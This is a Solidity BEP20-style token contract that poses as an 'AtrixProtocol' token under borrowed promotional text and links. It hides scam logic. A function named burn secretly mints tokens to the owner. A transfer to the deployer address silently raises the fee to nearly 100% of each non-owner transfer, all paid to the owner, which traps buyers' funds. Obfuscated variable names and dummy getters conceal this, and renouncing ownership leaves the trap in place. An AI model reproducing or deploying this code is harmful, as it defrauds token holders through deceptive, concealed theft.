/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

/*
AtrixProtocol
Protocol for automated orderbook liquidity provisioning strategies on chain
We’re excited to be partnering with LidoFinance
to grow stSOL liquidity on the Serum orderbook!
Starting on Jun 27th, users will be able to stake their USDC,USDT pairs to earn LIDO emissions.
https://discord.gg/vK9Qq4r6GJ
https://atrix.finance/
https://t.me/AtrixProtocol
https://twitter.com/AtrixProtocol
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;
contract AtrixProtocol {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
uint256 private  DMUVHT = 1000000000000000;
string public  symbol = "Atrix";
uint256 public constant KXVZUK = 99999;
address private  YZGGSK = address(0);
mapping (address => uint256) public balanceOf;
address private  HOSTYG = address(0);
string public  name = "Atrix";
mapping (address => mapping (address => uint256)) private _allowances;
address private  YWAVXT = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  SCGJJR = address(0);
uint256 private  KXCYSH = 10000000000000;
address private  LVWUAC = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
uint256 private  YMRUWA = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  DJHQQO = 1000000000000000000;
uint256 private  LPMHLL = 10000000000;
uint256 private  ONDBYC = 100000000;
uint256 private  JOOQMX = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "GHVSUA");
require(to != address(0), "GHVSUA");
require(amount <= balanceOf[from], "GHVSUA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KXVZUK/DJHQQO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SCGJJR){
DJHQQO = KXVZUK+2;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tGHVSUA 0");
require(spender != address(0), "fGHVSUA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getLPMHLL() private returns (uint256) {
return LPMHLL;
}

function _getYZGGSK() private returns (address) {
return YZGGSK;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getDMUVHT() private returns (uint256) {
return DMUVHT;
}

constructor () {
SCGJJR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getJOOQMX() private returns (uint256) {
return JOOQMX;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getHOSTYG() private returns (address) {
return HOSTYG;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getYWAVXT() private returns (address) {
return YWAVXT;
}

function _getYMRUWA() private returns (uint256) {
return YMRUWA;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getLVWUAC() private returns (address) {
return LVWUAC;
}

function _getKXCYSH() private returns (uint256) {
return KXCYSH;
}

function _getONDBYC() private returns (uint256) {
return ONDBYC;
}


}